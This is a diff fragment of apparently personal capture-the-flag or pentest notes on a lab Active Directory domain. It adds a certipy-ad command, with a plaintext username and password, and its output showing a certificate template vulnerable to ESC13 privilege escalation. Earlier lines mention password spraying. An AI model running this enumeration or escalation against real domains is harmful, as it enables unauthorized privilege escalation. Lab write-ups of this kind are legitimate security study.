@@ -227,6 +227,65 @@ I did also try spraying all the passwords found against other users, no luck
 
 I have write to the files share
 
+# ESC13
 
+```python
+❯❯❯ certipy-ad find -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-host dc01.kitsune.local -dc-ip 10.1.176.128 -target-ip 10.1.176.128 -target dc01.kitsune.local -stdout -enabled -vulnerable
+
+...[SNIP]...
+
+Certificate Templates
+  0
+    Template Name                       : Kitsune-User
+    Display Name                        : Kitsune-User
+    Certificate Authorities             : kitsune-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectRequireEmail
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+                                          AutoEnrollment
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 99 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 4096
+    Template Created                    : 2026-10-12T22:12:00+00:00
+    Template Last Modified              : 2026-10-13T00:52:56+00:00
+    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.10863307.14988779.16010669.3757508.10421200.134.6077557.15214621
+    Linked Groups                       : CN=HelpDesk,CN=Users,DC=kitsune,DC=local
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : KITSUNE.LOCAL\Domain Admins
+                                          KITSUNE.LOCAL\Domain Users
+                                          KITSUNE.LOCAL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : KITSUNE.LOCAL\Administrator
+        Full Control Principals         : KITSUNE.LOCAL\Domain Admins
+                                          KITSUNE.LOCAL\Enterprise Admins
+        Write Owner Principals          : KITSUNE.LOCAL\Domain Admins
+                                          KITSUNE.LOCAL\Enterprise Admins
+        Write Dacl Principals           : KITSUNE.LOCAL\Domain Admins
+                                          KITSUNE.LOCAL\Enterprise Admins
+        Write Property Enroll           : KITSUNE.LOCAL\Domain Admins
+                                          KITSUNE.LOCAL\Domain Users
+                                          KITSUNE.LOCAL\Enterprise Admins
+    [+] User Enrollable Principals      : KITSUNE.LOCAL\Domain Users
+    [!] Vulnerabilities
+      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=HelpDesk,CN=Users,DC=kitsune,DC=local'.
+```
+
+L
 
 
